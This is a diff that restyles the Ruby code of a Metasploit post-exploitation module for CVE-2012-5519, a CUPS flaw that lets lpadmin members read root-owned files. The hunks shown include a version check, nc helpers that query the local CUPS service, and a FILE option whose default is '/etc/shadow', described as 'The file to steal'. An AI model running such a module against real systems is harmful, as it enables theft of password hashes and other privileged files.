@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,14 +9,13 @@ require 'msf/core'
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  LP_GROUPS = ['lpadmin', '_lpadmin']
+  LP_GROUPS = ['lpadmin', '_lpadmin'].freeze
 
   attr_accessor :web_server_was_disabled, :error_log_was_reset
 
-  def initialize(info={})
-    super( update_info( info, {
-      'Name'           => 'CUPS 1.6.1 Root File Read',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(update_info(info, 'Name' => 'CUPS 1.6.1 Root File Read',
+                            'Description' => %q{
         This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.
         CUPS allows members of the lpadmin group to make changes to the cupsd.conf
         configuration, which can specify an Error Log path. When the user visits the
@@ -29,27 +29,25 @@ class MetasploitModule < Msf::Post
         this module might fail to reset that path correctly. You can specify
         a custom error log path with the ERROR_LOG datastore option.
       },
-      'References'     =>
+                            'References'     =>
         [
           ['CVE', '2012-5519'],
           ['OSVDB', '87635'],
           ['URL', 'http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']
         ],
-      'License'        => MSF_LICENSE,
-      'Author'         =>
+                            'License'        => MSF_LICENSE,
+                            'Author'         =>
         [
           "Jann Horn", # discovery
           "joev" # metasploit module
         ],
-      'DisclosureDate' => 'Nov 20 2012',
-      'Platform'       => %w{ linux osx }
-    }))
+                            'DisclosureDate' => 'Nov 20 2012',
+                            'Platform'       => %w(linux osx)))
     register_options([
-      OptString.new("FILE", [true, "The file to steal.", "/etc/shadow"]),
-      OptString.new("ERROR_LOG",
-        [true, "The original path to the CUPS error log", '/var/log/cups/error_log']
-      )
-    ], self.class)
+                       OptString.new("FILE", [true, "The file to steal.", "/etc/shadow"]),
+                       OptString.new("ERROR_LOG",
+                                     [true, "The original path to the CUPS error log", '/var/log/cups/error_log'])
+                     ], self.class)
   end
 
   def check_exploitability
@@ -70,7 +68,7 @@ class MetasploitModule < Msf::Post
     end
 
     nc_path = whereis("nc")
-    if nc_path.nil? or nc_path.blank?
+    if nc_path.nil? || nc_path.blank?
       print_error "Could not find nc executable"
       return Msf::Exploit::CheckCode::Unknown
     else
@@ -80,12 +78,10 @@ class MetasploitModule < Msf::Post
     config_path = whereis("cups-config")
     config_vn = nil
 
-    if config_path.nil? or config_path.blank?
+    if config_path.nil? || config_path.blank?
       # cups-config not present, ask the web interface what vn it is
       output = get_request('/')
-      if output =~ /title.*CUPS\s+([\d\.]+)/i
-        config_vn = $1.strip
-      end
+      config_vn = Regexp.last_match(1).strip if output =~ /title.*CUPS\s+([\d\.]+)/i
     else
       config_vn = cmd_exec("cups-config --version").strip # use cups-config if installed
     end
@@ -98,7 +94,7 @@ class MetasploitModule < Msf::Post
     print_status "Found CUPS #{config_vn}"
 
     config_parts = config_vn.split('.')
-    if config_vn.to_f < 1.6 or (config_vn.to_f <= 1.6 and config_parts[2].to_i < 2) # <1.6.2
+    if config_vn.to_f < 1.6 || ((config_vn.to_f <= 1.6) && config_parts[2].to_i < 2) # <1.6.2
       Msf::Exploit::CheckCode::Vulnerable
     else
       Msf::Exploit::CheckCode::Safe
@@ -152,7 +148,7 @@ class MetasploitModule < Msf::Post
   def whereis(exe)
     line = cmd_exec("whereis #{exe}")
     if line =~ /^\S+:\s*(\S*)/i
-      $1 # on ubuntu whereis returns "cupsctl: /usr/sbin/cupsctl"
+      Regexp.last_match(1) # on ubuntu whereis returns "cupsctl: /usr/sbin/cupsctl"
     else
       line # on osx it just returns '/usr/sbin/cupsctl'
     end
@@ -161,9 +157,7 @@ class MetasploitModule < Msf::Post
   def get_request(uri)
     output = perform_request(uri, 'nc -j localhost 631')
 
-    if output =~ /^usage: nc/
-      output = perform_request(uri, 'nc localhost 631')
-    end
+    output = perform_request(uri, 'nc localhost 631') if output =~ /^usage: nc/
 
     output
   end
